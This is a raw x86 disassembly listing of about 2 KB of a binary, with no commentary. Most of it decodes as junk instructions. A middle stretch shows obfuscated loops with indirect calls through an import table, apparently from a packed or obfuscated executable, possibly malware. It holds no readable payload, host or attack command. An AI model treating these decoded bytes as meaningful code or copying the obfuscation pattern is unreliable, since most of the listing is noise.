  413510:	out    dx,eax
  413511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413512:	int3   
  413513:	inc    edi
  413514:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413516:	sub    ebx,DWORD PTR [ecx+0x1ed97717]
  41351c:	and    eax,DWORD PTR [edi-0x6a2dce85]
  413522:	lahf   
  413523:	mov    dh,0xd7
  413525:	imul   ecx,DWORD PTR ds:0xca042b89,0x375b0e26
  41352f:	mov    ds:0xf9be18f1,al
  413534:	fld    QWORD PTR [esi-0x68]
  413537:	push   ecx
  413538:	mov    bh,BYTE PTR [ecx+0x11]
  41353b:	fwait
  41353c:	test   BYTE PTR [edx+0xc],0x24
  413540:	or     DWORD PTR [ebp-0x3c],ecx
  413543:	outs   dx,DWORD PTR ds:[esi]
  413544:	mov    edi,0x3a3bb4d8
  413549:	push   esp
  41354a:	mov    ebp,0xbdcfdad7
  41354f:	mov    al,0xe5
  413551:	lea    ebx,[ebx-0x37dbcad0]
  413557:	cli    
  413558:	xor    eax,0xf628493b
  41355d:	xchg   ecx,eax
  41355e:	sar    bl,1
  413560:	pop    eax
  413561:	push   edi
  413562:	pushf  
  413563:	jnp    0x4135b9
  413565:	setle  BYTE PTR [eax+0x98b2b5e]
  41356c:	fmul   QWORD PTR [esi+0x5d34a7a2]
  413572:	leave  
  413573:	lahf   
  413574:	ret    0x5e0c
  413577:	inc    ecx
  413578:	xlat   BYTE PTR ds:[ebx]
  413579:	jns    0x41350b
  41357b:	xchg   ebx,eax
  41357c:	adc    DWORD PTR [ebx],ebp
  41357e:	sbb    eax,DWORD PTR [ebx+0x73cdd2b2]
  413584:	fwait
  413585:	test   al,0xd
  413587:	xchg   esi,eax
  413588:	cdq    
  413589:	aam    0xdb
  41358b:	mov    ah,0x44
  41358d:	jl     0x4135f3
  41358f:	add    eax,0x5a11a546
  413594:	iret   
  413595:	jecxz  0x413520
  413597:	in     al,0x4d
  413599:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41359a:	sbb    al,0x84
  41359c:	test   eax,0x6818fe45
  4135a1:	mov    al,ds:0x10a651c2
  4135a6:	jo     0x4135cb
  4135a8:	pop    eax
  4135a9:	dec    edi
  4135aa:	dec    ecx
  4135ab:	iret   
  4135ac:	repnz cwde 
  4135ae:	mov    ds:0xbf7f4b81,eax
  4135b3:	cmp    al,0x5
  4135b5:	or     al,0xe3
  4135b7:	test   al,0x75
  4135b9:	xchg   ebp,eax
  4135ba:	cmp    dh,BYTE PTR [esi-0x28f88168]
  4135c0:	out    dx,eax
  4135c1:	mov    esp,0xba59085c
  4135c6:	sbb    DWORD PTR [ecx],ecx
  4135c8:	or     ebp,DWORD PTR [ebx+0x2c93841]
  4135ce:	pop    esi
  4135cf:	and    al,0xef
  4135d1:	inc    esi
  4135d2:	ret    
  4135d3:	jnp    0x413597
  4135d5:	icebp  
  4135d6:	cld    
  4135d7:	mov    eax,0xbb032a12
  4135dc:	cmp    DWORD PTR [ebx+0x53],eax
  4135df:	ins    BYTE PTR es:[edi],dx
  4135e0:	test   BYTE PTR [ebx-0x61],al
  4135e3:	sbb    eax,0x869dc67e
  4135e8:	dec    esi
  4135e9:	inc    esi
  4135ea:	int3   
  4135eb:	dec    ebx
  4135ec:	jecxz  0x4135c2
  4135ee:	arpl   dx,bp
  4135f0:	push   ebp
  4135f1:	retf   0xab90
  4135f4:	out    dx,eax
  4135f5:	push   0xe724545a
  4135fa:	pop    ds
  4135fb:	jae    0x413643
  4135fd:	xchg   ecx,ebp
  4135ff:	mov    esp,0xd8045d2f
  413604:	out    dx,al
  413605:	das    
  413606:	lock dec eax
  413608:	or     edi,DWORD PTR [esi]
  41360a:	adc    eax,DWORD PTR [esi]
  41360c:	jmp    0xb920ff33
  413611:	imul   ebp,DWORD PTR [ebx+0x630778c8],0xcdf22a9
  41361b:	inc    edx
  41361c:	cmp    al,0xd8
  41361e:	push   edi
  41361f:	call   0x8e360de7
  413624:	dec    eax
  413625:	adc    DWORD PTR [eax],esi
  413627:	mov    bl,0x11
  413629:	into   
  41362a:	(bad)  
  41362c:	xor    al,BYTE PTR [eax]
  41362e:	adc    dx,WORD PTR [ebx]
  413631:	sub    dh,BYTE PTR [esi]
  413633:	or     bl,ah
  413635:	jg     0x4135fc
  413637:	add    DWORD PTR [edi+0x320dcfe5],esi
  41363d:	fimul  DWORD PTR ds:0x1ed9656f
  413643:	lea    edi,[ecx]
  413645:	cmp    eax,0xfc80ce6c
  41364a:	repnz sub dh,BYTE PTR es:[eax+0x3e]
  41364f:	add    al,0xa
  413651:	dec    ebx
  413652:	(bad)  
  413653:	pop    esi
  413654:	xchg   cx,ax
  413656:	sub    dh,BYTE PTR [eax+0x48]
  413659:	add    eax,0x5ee88379
  41365e:	shl    al,cl
  413660:	mov    ecx,0x2a5ff481
  413665:	es into 
  413667:	imul   eax,DWORD PTR cs:[edi-0x15],0xab726d6f
  41366f:	inc    edi
  413670:	xchg   esp,eax
  413671:	fisttp DWORD PTR [bx+di]
  413674:	push   0xffffff9f
  413676:	mov    ds:0xed242ee1,eax
  41367b:	adc    BYTE PTR [ebp+0x19a08dc2],bl
  413681:	setge  ch
  413684:	push   cs
  413685:	add    edx,DWORD PTR [ebp+0x186c2140]
  41368b:	pop    es
  41368c:	imul   edi,DWORD PTR [edx+0x49],0x9736c393
  413693:	hlt    
  413694:	xchg   edi,eax
  413695:	mov    edx,0x3ab314a
  41369a:	dec    ebx
  41369b:	sar    bl,1
  41369d:	adc    dl,BYTE PTR [ecx+0xf3159af]
  4136a3:	(bad)  
  4136a4:	mov    dl,0x27
  4136a6:	or     BYTE PTR [ebx+0x42],bl
  4136a9:	lock mov eax,ds:0xc532dcd0
  4136af:	sar    BYTE PTR [ebp+0xf],cl
  4136b2:	lods   eax,DWORD PTR ds:[esi]
  4136b3:	call   0x2b82:0xf532d212
  4136ba:	mov    edi,0x71d15b7a
  4136bf:	out    0x96,eax
  4136c1:	and    ecx,DWORD PTR [esi+0x60]
  4136c4:	fdivr  st,st(1)
  4136c6:	jle    0x4136e9
  4136c8:	or     BYTE PTR [esi],ch
  4136ca:	shl    dl,cl
  4136cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136cd:	mov    ds:0xb03450ca,al
  4136d2:	dec    esp
  4136d3:	cdq    
  4136d4:	xor    eax,0xf813bae2
  4136d9:	(bad)  
  4136da:	stc    
  4136db:	fisttp QWORD PTR [edi-0x53]
  4136de:	not    BYTE PTR [esi+0x2e]
  4136e1:	in     al,0x44
  4136e3:	push   esp
  4136e4:	add    BYTE PTR [edi],ah
  4136e6:	call   0xd58f:0x67bc519
  4136ed:	stos   DWORD PTR es:[edi],eax
  4136ee:	scas   al,BYTE PTR es:[edi]
  4136ef:	cwde   
  4136f0:	mov    ds:0x1ef5d733,al
  4136f5:	imul   ebp,ebp,0x55
  4136f8:	mov    ah,0x67
  4136fa:	xor    edi,esi
  4136fc:	cmp    DWORD PTR [edx],eax
  4136fe:	xchg   edx,eax
  4136ff:	lock mov edx,0x1a027189
  413705:	fimul  WORD PTR [ebp-0x2bcde35f]
  41370b:	ins    DWORD PTR es:[edi],dx
  41370c:	lods   al,BYTE PTR ds:[esi]
  41370d:	cs stos BYTE PTR es:[edi],al
  41370f:	out    0xa0,eax
  413711:	mov    cl,0x12
  413713:	out    dx,al
  413714:	pop    esp
  413715:	lods   eax,DWORD PTR ds:[esi]
  413716:	push   cs
  413717:	cmp    eax,0x1c81573d
  41371c:	dec    edx
  41371d:	popf   
  41371e:	adc    DWORD PTR [esi],edx
  413720:	retf   0xf91a
  413723:	jle    0x4136bf
  413725:	push   ecx
  413726:	ret    
  413727:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413728:	hlt    
  413729:	clc    
  41372a:	xor    dh,BYTE PTR [eax-0x1f]
  41372d:	and    BYTE PTR [eax],al
  41372f:	jno    0x413796
  413731:	jne    0x4136e6
  413733:	cmc    
  413734:	inc    esi
  413735:	stos   DWORD PTR es:[edi],eax
  413736:	sahf   
  413737:	outs   dx,DWORD PTR ds:[esi]
  413738:	adc    BYTE PTR [ebp-0x1c],bh
  41373b:	bound  eax,QWORD PTR [esi-0x64]
  41373e:	or     BYTE PTR [ecx+0xd466b25],bh
  413744:	clc    
  413745:	xor    eax,0xca4d2415
  41374a:	add    esp,eax
  41374c:	add    DWORD PTR ds:0x3009040d,ebp
  413752:	sub    BYTE PTR [esi+0x24],bh
  413755:	adc    al,0x6c
  413757:	dec    edi
  413758:	je     0x48fd6075
  41375e:	xchg   esi,eax
  41375f:	or     BYTE PTR [edx-0x43],dl
  413762:	xchg   edx,eax
  413763:	cli    
  413764:	jmp    0xbc95:0x6064dbd
  41376b:	pop    ebp
  41376c:	fild   WORD PTR [edi]
  41376e:	xchg   edi,eax
  41376f:	adc    al,0xc8
  413771:	xlat   BYTE PTR ds:[ebx]
  413772:	mov    al,ds:0x3f25a46f
  413777:	push   esp
  413778:	push   ebp
  413779:	inc    edi
  41377a:	lods   eax,DWORD PTR ds:[esi]
  41377b:	or     al,0x53
  41377d:	sbb    eax,0xb4fed35d
  413782:	arpl   WORD PTR [eax+0x75],cx
  413785:	retf   
  413786:	push   cs
  413787:	imul   esp,DWORD PTR [edi+eiz*4],0x4ef400
  41378e:	lods   eax,DWORD PTR ss:[esi]
  413790:	stos   DWORD PTR es:[edi],eax
  413791:	aas    
  413792:	daa    
  413793:	fdiv   DWORD PTR [edx-0x11dfb0be]
  413799:	lahf   
  41379a:	and    bh,BYTE PTR [esi]
  41379c:	adc    esi,DWORD PTR [edi]
  41379e:	push   ss
  41379f:	push   ds
  4137a0:	add    eax,0xe333c16d
  4137a5:	fild   QWORD PTR [ebx+0x277b5259]
  4137ab:	add    DWORD PTR [edx+0x412949c5],edi
  4137b1:	jmp    0x413803
  4137b3:	sbb    al,0xca
  4137b5:	jge    0x413742
  4137b7:	inc    esi
  4137b8:	jne    0x413769
  4137ba:	(bad)
  4137be:	mov    dh,0x6c
  4137c0:	aad    0x96
  4137c2:	in     al,dx
  4137c3:	push   0x3e
  4137c5:	test   BYTE PTR [eax],0xe
  4137c8:	in     eax,dx
  4137c9:	jg     0x4137e1
  4137cb:	lock pop esi
  4137cd:	xor    esi,edi
  4137cf:	xchg   ecx,eax
  4137d0:	jae    0x4137f7
  4137d2:	sbb    BYTE PTR [ecx-0x1],al
  4137d5:	clc    
  4137d6:	stos   BYTE PTR es:[edi],al
  4137d7:	fstp   TBYTE PTR [edi+0x78770bd4]
  4137dd:	aaa    
  4137de:	das    
  4137df:	sub    eax,DWORD PTR [esi-0x34]
  4137e2:	test   BYTE PTR [edx-0x128619c4],dh
  4137e8:	test   al,0x4e
  4137ea:	inc    edi
  4137eb:	push   es
  4137ec:	icebp  
  4137ed:	adc    BYTE PTR [esp+ecx*2+0x289eed9c],dl
  4137f4:	mov    al,ds:0x93ce2815
  4137f9:	loope  0x413789
  4137fb:	int3   
  4137fc:	lea    ebx,[edx+esi*2-0x43565d2a]
  413803:	push   ebp
  413804:	int3   
  413805:	pop    edx
  413806:	dec    eax
  413807:	stos   BYTE PTR es:[edi],al
  413808:	pop    esi
  413809:	or     BYTE PTR [ecx],bh
  41380b:	and    eax,0x37e7e9bd
  413810:	mov    ebx,0x2073b0fc
  413815:	jb     0x413845
  413817:	push   es
  413818:	cli    
  413819:	jg     0x4137ab
  41381b:	imul   ebp,DWORD PTR [esi+0xe],0x6bd9691
  413822:	dec    ebx
  413823:	out    dx,al
  413824:	push   edi
  413825:	sahf   
  413826:	or     ch,BYTE PTR ss:[edi+0x38]
  41382a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41382b:	repnz iret 
  41382d:	aaa    
  41382e:	ss push 0x5e
  413831:	sbb    WORD PTR [eax+0x29],di
  413835:	js     0x413804
  413837:	sbb    eax,0x1af8c0fa
  41383c:	mov    DWORD PTR [edi+0x512ac5fc],ebx
  413842:	push   ebx
  413843:	or     eax,0x8ad8756f
  413848:	popf   
  413849:	mov    ds:0xc5d4f6eb,eax
  41384e:	aas    
  41384f:	jmp    0x5260bae2
  413854:	sub    BYTE PTR [esi-0x40],dl
  413857:	adc    al,0x2d
  413859:	mov    ?,WORD PTR [edx-0x528b83]
  41385f:	mov    dh,0x39
  413861:	rcr    DWORD PTR [eax+0x4c],1
  413864:	rcl    BYTE PTR [edx+0x461ccb27],0x11
  41386b:	xchg   edi,eax
  41386c:	push   es
  41386d:	imul   BYTE PTR [ebx-0x4336b369]
  413873:	sub    dl,BYTE PTR [edi-0x67]
  413876:	xor    ecx,ebx
  413878:	cmp    BYTE PTR [ebp+0x8],al
  41387b:	outs   dx,BYTE PTR ds:[esi]
  41387c:	dec    ecx
  41387d:	or     edx,DWORD PTR ds:0x9827f0ab
  413883:	xchg   BYTE PTR [ecx+0x3],ch
  413886:	pop    ecx
  413887:	lahf   
  413888:	push   ebx
  413889:	cwde   
  41388a:	pushf  
  41388b:	adc    bh,BYTE PTR [ebx+ebp*1+0x61]
  41388f:	sbb    ah,BYTE PTR [ebx-0x50]
  413892:	xchg   esi,eax
  413893:	xchg   ebx,eax
  413894:	imul   eax,DWORD PTR [eax],0x260dce60
  41389a:	inc    esi
  41389b:	xchg   edx,eax
  41389c:	inc    edx
  41389d:	inc    edx
  41389e:	repz (bad) 
  4138a0:	fcom   DWORD PTR [ecx]
  4138a2:	mov    eax,ds:0x6d1802d0
  4138a7:	(bad)  
  4138a8:	jb     0x4138db
  4138aa:	pop    ecx
  4138ab:	xor    ecx,DWORD PTR [ebx]
  4138ad:	sub    edi,DWORD PTR ds:0x1a78aca
  4138b3:	mov    ds:0x2d4facfe,eax
  4138b8:	aad    0xb8
  4138ba:	sar    DWORD PTR [edx],1
  4138bc:	mov    ds:0x84379e55,al
  4138c1:	mov    BYTE PTR [eax],al
  4138c3:	neg    DWORD PTR [edi]
  4138c5:	leave  
  4138c6:	popa   
  4138c7:	xor    ecx,DWORD PTR [edi-0x6e5df6e0]
  4138cd:	mov    cl,0x90
  4138cf:	xchg   edx,esi
  4138d1:	mov    ebx,0xb74fe7bd
  4138d6:	outs   dx,DWORD PTR ds:[esi]
  4138d7:	mov    ah,0xc5
  4138d9:	sub    eax,0x541aeccb
  4138de:	xchg   ebp,eax
  4138df:	arpl   WORD PTR [ebx-0x27ccb8de],bx
  4138e5:	and    DWORD PTR ds:0x42b01c,0x4e66
  4138ef:	sub    edx,ebx
  4138f1:	sub    edx,esi
  4138f3:	adc    DWORD PTR ds:0x42c014,0x3307
  4138fd:	xor    edx,eax
  4138ff:	add    DWORD PTR ds:0x42d004,0x3241
  413909:	mov    DWORD PTR [ebp+0x8],edx
  41390c:	or     ebx,ebx
  41390e:	mov    edx,DWORD PTR [ebp+0x8]
  413911:	mov    ebx,DWORD PTR [ebp-0x58]
  413914:	sub    DWORD PTR ds:0x429004,0x42c00c
  41391e:	add    edx,0x5708c4
  413924:	imul   edx,ebx
  413927:	mov    DWORD PTR [ebp-0x58],edx
  41392a:	mov    edx,DWORD PTR [ebp+0x8]
  41392d:	and    DWORD PTR ds:0x42d01c,0x0
  413937:	mov    ebx,DWORD PTR ds:0x42d01c
  41393d:	inc    ebx
  41393e:	mov    DWORD PTR ds:0x42d01c,ebx
  413944:	cmp    DWORD PTR ds:0x42d01c,0x29
  41394b:	jne    0x41395a
  413951:	push   DWORD PTR [ebp-0x24]
  413954:	call   DWORD PTR ds:0x42e913
  41395a:	cmp    DWORD PTR ds:0x42d01c,0x1e
  413961:	jb     0x413937
  413967:	and    DWORD PTR ds:0x42d004,0x0
  413971:	mov    ebx,DWORD PTR ds:0x42d004
  413977:	inc    ebx
  413978:	mov    DWORD PTR ds:0x42d004,ebx
  41397e:	cmp    DWORD PTR ds:0x42d004,0x7
  413985:	jne    0x4139a0
  41398b:	push   0x1baa
  413990:	push   0x42e075
  413995:	push   0x429010
  41399a:	call   DWORD PTR ds:0x42e917
  4139a0:	cmp    DWORD PTR ds:0x42d004,0x6
  4139a7:	jne    0x4139ba
  4139ad:	mov    ebx,DWORD PTR ds:0x42d004
  4139b3:	inc    ebx
  4139b4:	mov    DWORD PTR ds:0x42d004,ebx
  4139ba:	cmp    DWORD PTR ds:0x42d004,0x14
  4139c1:	jb     0x413971
  4139c7:	add    DWORD PTR ds:0x42d000,edx
  4139cd:	mov    ebx,DWORD PTR [ebp-0x54]
  4139d0:	mov    DWORD PTR ds:0x42b008,0x4ad3
  4139da:	add    edx,0x64f8da
  4139e0:	or     edx,ebx
  4139e2:	add    DWORD PTR ds:0x42c008,0x5d21
  4139ec:	mov    DWORD PTR [ebp-0x54],edx
  4139ef:	mov    edx,DWORD PTR [ebp+0x8]
  4139f2:	mov    ebx,DWORD PTR [ebp-0x50]
  4139f5:	and    DWORD PTR ds:0x42b008,0x3404
  4139ff:	add    edx,ecx
  413a01:	xor    DWORD PTR ds:0x42a000,0x42d000
  413a0b:	xor    edx,ebx
  413a0d:	mov    DWORD PTR [ebp-0x50],edx
  413a10:	add    ebx,edx
  413a12:	mov    edx,DWORD PTR [ebp+0x8]
  413a15:	adc    DWORD PTR ds:0x429008,edx
  413a1b:	mov    ebx,DWORD PTR [ebp-0x4c]
  413a1e:	or     DWORD PTR ds:0x429028,0x42d010
  413a28:	add    edx,edi
  413a2a:	or     DWORD PTR ds:0x429008,0x429010
  413a34:	and    edx,ebx
  413a36:	xor    DWORD PTR ds:0x429028,ecx
  413a3c:	mov    DWORD PTR [ebp-0x4c],edx
  413a3f:	mov    DWORD PTR ds:0x42c004,0x18
  413a49:	cmp    DWORD PTR ds:0x42c004,0x0
  413a50:	je     0x413a93
  413a56:	cmp    DWORD PTR ds:0x42c004,0x1e
  413a5d:	jne    0x413a7b
  413a63:	push   0x42a004
  413a68:	push   0x2285
  413a6d:	push   DWORD PTR [ebp-0x24]
  413a70:	push   0x1fc0
  413a75:	call   DWORD PTR ds:0x42e8cf
  413a7b:	mov    ebx,DWORD PTR ds:0x42c004
  413a81:	dec    ebx
  413a82:	mov    DWORD PTR ds:0x42c004,ebx
  413a88:	jmp    0x413a49
  413a8d:	add    DWORD PTR ds:0x42d00c,ecx
  413a93:	mov    edx,DWORD PTR [ebp+0x8]
  413a96:	sbb    ebx,DWORD PTR ds:0x42a00c
  413a9c:	mov    ebx,DWORD PTR [ebp-0x48]
  413a9f:	lea    edx,[ebx+edx*1+0x241fc1f]
  413aa6:	mov    DWORD PTR [ebp-0x48],edx
  413aa9:	inc    edx
  413aaa:	mov    edx,DWORD PTR [ebp+0x8]
  413aad:	movzx  ebx,BYTE PTR ds:0x429000
  413ab4:	sbb    DWORD PTR ds:0x42c018,ebx
  413aba:	mov    ebx,0xfa5e15e2
  413abf:	sub    ebx,edx
  413ac1:	add    ebx,DWORD PTR [ebp-0x44]
  413ac4:	and    DWORD PTR ds:0x42c018,0x0
  413ace:	jmp    0x413ae0
  413ad3:	mov    edx,DWORD PTR ds:0x42c018
  413ad9:	inc    edx
  413ada:	mov    DWORD PTR ds:0x42c018,edx
  413ae0:	cmp    DWORD PTR ds:0x42c018,0x15
  413ae7:	jae    0x413b1a
  413aed:	cmp    DWORD PTR ds:0x42c018,0x18
  413af4:	jne    0x413b0f
  413afa:	push   0x88b0
  413aff:	push   0x8c9b
  413b04:	push   0x27a5
  413b09:	call   DWORD PTR ds:0x42e8d3
  413b0f:	jmp    0x413ad3
  413b14:	or     DWORD PTR ds:0x42b004,edx
  413b1a:	mov    DWORD PTR [ebp-0x44],ebx
  413b1d:	mov    DWORD PTR ds:0x42d00c,0x11
  413b27:	cmp    DWORD PTR ds:0x42d00c,0x0
  413b2e:	je     0x413b75
  413b34:	cmp    DWORD PTR ds:0x42d00c,0x1d
  413b3b:	jne    0x413b59
  413b41:	push   0x88e0
  413b46:	push   DWORD PTR [ebp-0x18]
  413b49:	push   0x3079
  413b4e:	push   0x26f3
  413b53:	call   DWORD PTR ds:0x42e8d7
  413b59:	mov    edx,DWORD PTR ds:0x42d00c
  413b5f:	dec    edx
  413b60:	mov    DWORD PTR ds:0x42d00c,edx
  413b66:	jmp    0x413b27
  413b6b:	add    DWORD PTR ds:0x42a014,0x1458
  413b75:	mov    edx,DWORD PTR [ebp+0x8]
  413b78:	xor    DWORD PTR ds:0x429008,0x1867
  413b82:	xor    edx,eax
  413b84:	mov    DWORD PTR ds:0x42900c,0x6609
  413b8e:	add    edx,esi
  413b90:	mov    DWORD PTR ds:0x42d008,0x7de
  413b9a:	jne    0x41157e
  413ba0:	mov    DWORD PTR ds:0x42a008,0x2294
  413baa:	jmp    0x41cc2e
  413baf:	xor    edx,edx
  413bb1:	add    edx,DWORD PTR ds:0x42d014
  413bb7:	sbb    DWORD PTR ds:0x429008,edx
  413bbd:	mov    edx,DWORD PTR [ebp-0xc]
  413bc0:	mov    DWORD PTR ds:0x429010,0x17
  413bca:	cmp    DWORD PTR ds:0x429010,0x0
  413bd1:	je     0x413c04
  413bd7:	cmp    DWORD PTR ds:0x429010,0x18
  413bde:	jne    0x413bea
  413be4:	call   DWORD PTR ds:0x42e91b
  413bea:	xor    ebx,ebx
  413bec:	add    ebx,DWORD PTR ds:0x429010
  413bf2:	dec    ebx
  413bf3:	mov    DWORD PTR ds:0x429010,ebx
  413bf9:	jmp    0x413bca
  413bfe:	or     DWORD PTR ds:0x42c014,ebx
  413c04:	sub    edx,esi
  413c06:	xor    edx,eax
  413c08:	mov    ebx,DWORD PTR ds:0x41cdd0
  413c0e:	mov    ebx,DWORD PTR [ebx]
  413c10:	sub    DWORD PTR ds:0x42b018,ebx
  413c16:	mov    DWORD PTR [ebp-0x5c],edx
  413c19:	and    DWORD PTR ds:0x42b004,0x0
  413c23:	jmp    0x413c35
  413c28:	mov    ebx,DWORD PTR ds:0x42b004
  413c2e:	inc    ebx
  413c2f:	mov    DWORD PTR ds:0x42b004,ebx
  413c35:	cmp    DWORD PTR ds:0x42b004,0x1c
  413c3c:	jae    0x413c60
  413c42:	cmp    DWORD PTR ds:0x42b004,0x24
  413c49:	jne    0x413c5b
  413c4f:	push   DWORD PTR [ebp-0x1c]
  413c52:	push   DWORD PTR [ebp-0x10]
  413c55:	call   DWORD PTR ds:0x42e91f
  413c5b:	jmp    0x413c28
  413c60:	mov    edx,DWORD PTR [ebp-0x10]
  413c63:	mov    ebx,DWORD PTR [ebp-0x8]
  413c66:	xor    edx,eax
  413c68:	xor    ebx,eax
  413c6a:	sub    edx,ebx
  413c6c:	sub    edx,esi
  413c6e:	xor    edx,eax
  413c70:	mov    DWORD PTR [ebp-0x10],edx
  413c73:	mov    edx,DWORD PTR [ebp-0x14]
  413c76:	mov    DWORD PTR [ebp+0x8],edx
  413c79:	jmp    0x416037
  413c7e:	mov    edx,DWORD PTR [ebp+0x8]
  413c81:	mov    ebx,DWORD PTR [ebp-0x8]
  413c84:	xor    edx,eax
  413c86:	xor    ebx,eax
  413c88:	sub    edx,ebx
  413c8a:	sub    edx,esi
  413c8c:	xor    edx,eax
  413c8e:	mov    DWORD PTR [ebp+0x8],edx
  413c91:	mov    edx,DWORD PTR [ebp+0x8]
  413c94:	mov    ebx,DWORD PTR [ebp-0x58]
  413c97:	add    edx,0x5708c4
  413c9d:	imul   edx,ebx
  413ca0:	mov    DWORD PTR [ebp-0x58],edx
  413ca3:	mov    edx,DWORD PTR [ebp+0x8]
  413ca6:	mov    ebx,DWORD PTR [ebp-0x54]
  413ca9:	add    edx,0x64f8da
  413caf:	or     edx,ebx
  413cb1:	mov    DWORD PTR [ebp-0x54],edx
  413cb4:	mov    edx,DWORD PTR [ebp+0x8]
  413cb7:	mov    ebx,DWORD PTR [ebp-0x50]
  413cba:	add    edx,ecx
  413cbc:	jmp    0x416005
  413cc1:	xchg   ecx,eax
  413cc2:	mov    bh,BYTE PTR [edx]
  413cc4:	aad    0x3
  413cc6:	mov    ch,0x93
  413cc8:	mov    ah,al
  413cca:	xor    ebx,ecx
  413ccc:	ja     0x413d3a
  413cce:	inc    edi
  413ccf:	nop
  413cd0:	mov    esi,0x7c7c8a14
  413cd5:	inc    eax
  413cd6:	pop    edi
  413cd7:	jl     0x413d55
  413cd9:	and    cl,BYTE PTR [eax+0x34]
  413cdc:	ss mov bl,0x7c
  413cdf:	mov    cl,BYTE PTR [ebp+ebx*4-0xb96cbe0]
  413ce6:	scas   eax,DWORD PTR es:[edi]
  413ce7:	jns    0x413ce6
  413ce9:	fmul   st(5),st
  413ceb:	test   DWORD PTR [edi+0x59],0x15b1e409
  413cf2:	stc    
  413cf3:	(bad)  
  413cf5:	pop    ecx
  413cf6:	pop    ecx
  413cf7:	pushf  
  413cf8:	pop    ecx
  413cf9:	ja     0x413cd6
  413cfb:	(bad)  
  413cfc:	push   edx
  413cfd:	rol    DWORD PTR [esi],0x88
  413d00:	sbb    al,0x49
  413d02:	nop
  413d03:	xlat   BYTE PTR ds:[ebx]
  413d04:	xchg   ebx,eax
  413d05:	mov    ds,WORD PTR [esi+0x0]
  413d08:	fistp  DWORD PTR [ebx-0x60af71ed]
  413d0e:	repnz mov eax,ds:0xedd17d76
  413d14:	dec    esi
  413d15:	mov    al,0x53
  413d17:	xor    eax,0x140e00b0
  413d1c:	and    BYTE PTR [ecx+ecx*2+0x298273bf],dh
  413d23:	ret    
  413d24:	mov    al,ds:0x60e1b3c1
  413d29:	push   eax
  413d2a:	loop   0x413d24
  413d2c:	fadd   st,st(7)
  413d2e:	(bad)  
  413d2f:	je     0x413cfb
  413d31:	jp     0x413cce
  413d33:	fsub   DWORD PTR [ebp-0x23]
  413d36:	je     0x413d56
  413d38:	mov    ecx,0xd7b4fec
  413d3d:	add    al,ch
  413d3f:	adc    al,0xc2
  413d41:	add    ah,BYTE PTR [esi+0x73d678ee]
  413d47:	jmp    0x413db5
  413d49:	pop    ebx
  413d4a:	adc    eax,0xce9ff24a
  413d4f:	inc    eax
  413d50:	push   ebx
  413d51:	cmp    al,0xd5
  413d53:	stos   DWORD PTR es:[edi],eax
  413d54:	test   BYTE PTR ds:0x99d3ff06,0xd2
  413d5b:	jnp    0x413d3b
  413d5d:	dec    ecx
  413d5e:	dec    eax
  413d5f:	mov    ch,0xfc
  413d61:	mov    esi,0x955417a8
  413d66:	mov    esi,0x9b27363e
  413d6b:	(bad)  
  413d6c:	loop   0x413ddf
  413d6e:	sub    DWORD PTR [ecx],esp
  413d70:	call   0x83912d11
  413d75:	adc    BYTE PTR [ebx+ebp*8+0x79],cl
  413d79:	pop    ss
  413d7a:	mov    bl,0x2
  413d7c:	sbb    al,0x1e
  413d7e:	enter  0x9751,0x3c
  413d82:	push   cs
  413d83:	mov    edi,0x8a7f7370
  413d88:	das    
  413d89:	shl    DWORD PTR [ebx+eiz*1-0x5435c904],cl
  413d90:	mov    bl,ah
  413d92:	adc    ah,BYTE PTR [edi+0x73]
  413d95:	inc    esp
  413d96:	imul   edx,DWORD PTR [eax-0x10],0x44
  413d9a:	test   DWORD PTR [ebp-0xf],0x40a5c155
  413da1:	ins    DWORD PTR es:[edi],dx
  413da2:	xor    eax,0xa5e47e54
  413da7:	and    cl,BYTE PTR [esi+ebp*1]
  413daa:	pusha  
  413dab:	dec    eax
  413dac:	xor    edx,DWORD PTR [edx+0x18]
  413daf:	aaa    
  413db0:	stos   DWORD PTR es:[edi],eax
  413db1:	sbb    DWORD PTR [edx],ecx
  413db3:	adc    al,0x99
  413db5:	push   0xffffff92
  413db7:	int3   
  413db8:	mov    bl,0x74
  413dba:	call   0x9655b6d8
  413dbf:	or     al,0xf
  413dc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413dc2:	shl    DWORD PTR [ebp-0x781e3652],0x70
  413dc9:	ror    BYTE PTR [eax+edx*1-0x7c473fb5],1
  413dd0:	mov    dh,BYTE PTR [edx+ecx*8-0x357dd730]
  413dd7:	inc    ecx
  413dd8:	(bad)  
  413dd9:	xchg   ebx,eax
  413dda:	or     WORD PTR [edx+esi*4-0x11],cx
  413ddf:	not    DWORD PTR [edi-0x6a]
  413de2:	mov    edx,DWORD PTR [esi]
  413de4:	popa   
  413de5:	cmp    al,0xc8
  413de7:	mov    ebx,0xbe1d371
  413dec:	and    al,0xec
  413dee:	and    dh,BYTE PTR [eax+0x20]
  413df1:	scas   eax,DWORD PTR es:[edi]
  413df2:	pop    es
  413df3:	mov    dh,0x0
  413df5:	xor    BYTE PTR [edi],0x18
  413df8:	mov    eax,ds:0x4540f580
  413dfd:	add    edi,DWORD PTR [eax+ebx*2+0x2e63b34c]
  413e04:	mov    eax,0xbc681c7e
  413e09:	inc    eax
  413e0a:	std    
  413e0b:	test   BYTE PTR [esi-0x5403b91e],0x0
  413e12:	call   0x8ef0:0xe1444ca0
  413e19:	(bad)  
  413e1a:	jmp    0x99f7b371
  413e1f:	inc    eax
  413e20:	or     BYTE PTR [eax],ch
  413e22:	jge    0x413e5a
  413e24:	scas   eax,DWORD PTR es:[edi]
  413e25:	mov    ah,0x38
  413e27:	mov    edx,0x3c4ddd8c
  413e2d:	out    dx,eax
  413e2e:	xlat   BYTE PTR ds:[ebx]
  413e2f:	mov    ecx,0xe06acc1a
  413e34:	out    0xdf,eax
  413e36:	je     0x413e14
  413e38:	push   0xbbec5b9e
  413e3d:	out    dx,al
  413e3e:	and    al,0xfb
  413e40:	fnsave [edi]
  413e42:	inc    edi
  413e43:	lods   al,BYTE PTR ds:[esi]
  413e44:	shr    edx,0x6f
  413e47:	popa   
  413e48:	sbb    DWORD PTR ds:0x46782a56,0xffffffcd
  413e4f:	xor    ecx,edi
  413e51:	mov    eax,0x5c2a5a96
  413e56:	sub    eax,0xb179aee0
  413e5b:	jl     0x413ed0
  413e5d:	inc    ebx
